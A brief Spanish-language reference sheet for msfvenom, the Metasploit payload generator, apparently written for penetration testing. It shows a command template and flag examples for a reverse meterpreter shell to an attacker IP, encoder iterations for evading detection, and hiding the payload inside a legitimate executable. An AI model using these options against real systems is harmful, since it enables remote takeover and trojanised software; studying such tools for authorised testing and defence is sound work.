```
msfvenom -p [payload] [LHOST=ip] [LPORT=puerto] [opciones] -f [formato] -o [archivo]
```

| **Flag**                     | **Función**                      | **Ejemplo**                                |
| ---------------------------- | -------------------------------- | ------------------------------------------ |
| `-p`                         | Payload principal                | `-p windows/x64/meterpreter_reverse_https` |
| `LHOST`                      | IP atacante                      | `LHOST=10.10.10.5`                         |
| `LPORT`                      | Puerto atacante                  | `LPORT=443`                                |
| `RHOST`                      | IP víctima (bind)                | `RHOST=192.168.1.100`                      |
| `EXITFUNC`                   |                                  | `EXITFUNC=thread`                          |
| `-f exe`                     | Formato                          | `-f exe -o shell.exe`                      |
| `-e`                         | Encoder (`--list encoders`)      | `-e x64/shikata_ga_nai`                    |
| `-i`                         | Iteraciones encoder              | `-i 15`                                    |
| `-b`                         | Badchars a evitar                | `-b "\x00\x0a\x0d\x20"`                    |
| `-a`                         | Arquitectura (`--list archs`)    | `-a x64 --platform windows`                |
| `-x`                         | Plantilla (exe legítimo)         | `-x legitimate.exe`                        |
| `-k`                         | Mantener funcionalidad plantilla | `-k`                                       |
| `--list payloads`            | Listar payloads                  | `--list payloads \| grep reverse`          |
| `--platform`                 | `--list platforms`               |                                            |
| `DisablePayloadHandler=True` | No levanta handler automático    | `DisablePayloadHandler=True`               |